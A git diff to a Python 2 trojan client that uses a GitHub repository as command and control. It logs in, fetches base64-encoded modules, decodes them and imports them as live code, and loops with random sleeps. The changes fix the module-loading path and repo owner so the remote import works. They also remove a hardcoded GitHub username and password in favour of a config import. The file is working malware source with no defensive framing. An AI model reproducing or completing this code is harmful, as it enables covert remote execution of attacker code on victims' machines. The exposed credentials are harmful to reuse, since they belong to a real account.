@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 '''gh runner'''
 
+from my_conn import MY_GHC
+
 import json
 import base64
 import sys
@@ -17,8 +19,8 @@ class GHWorker(object):
     '''help with all the gh'''
     def __init__(self, username, password, repo, repo_owner=None):
         self.id = 'abc'
-        self.config_name = '%s.json' % id
-        self.data_path = 'data/%s/' % id
+        self.config_name = '%s.json' % self.id
+        self.data_path = 'data/%s/' % self.id
         self.module_path = 'modules/'
         self.modules = []
         self.configured = False
@@ -33,7 +35,7 @@ class GHWorker(object):
     def connect_to_github(self):
         '''connect to github'''
         ghconnection = login(username=self.username, password=self.password)
-        repo = ghconnection.repository(self.username, self.repo_name)
+        repo = ghconnection.repository(self.repo_owner, self.repo_name)
         branch = repo.branch(self.branch_name)
         return (ghconnection, repo, branch)
     def get_file_contents(self, filepath):
@@ -77,7 +79,8 @@ class GHImporter(object):
         '''find the specified module'''
         if self.worker.configured:
             print '[*] Attempting to retrieve %s' % fullname
-            new_library = self.worker.get_file_contents(self.worker.module_path)
+            module_path = '%s%s' % (self.worker.module_path, fullname)
+            new_library = self.worker.get_file_contents(module_path)
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
                 return self
@@ -113,9 +116,5 @@ class Runner(object):
                     time.sleep(random.randint(1, 10))
         time.sleep(random.randint(1000, 10000))
 
-#Runner(sys.argv[1], sys.argv[2], sys.argv[3]).main()
 
-try:
-    Runner('trj275433', 'Trj944717;', 'ch7', 'snlnewshost').main()
-except Exception as err:
-    print str(err)
+Runner(MY_GHC.uname, MY_GHC.pword, MY_GHC.repo_name, MY_GHC.repo_owner).main()
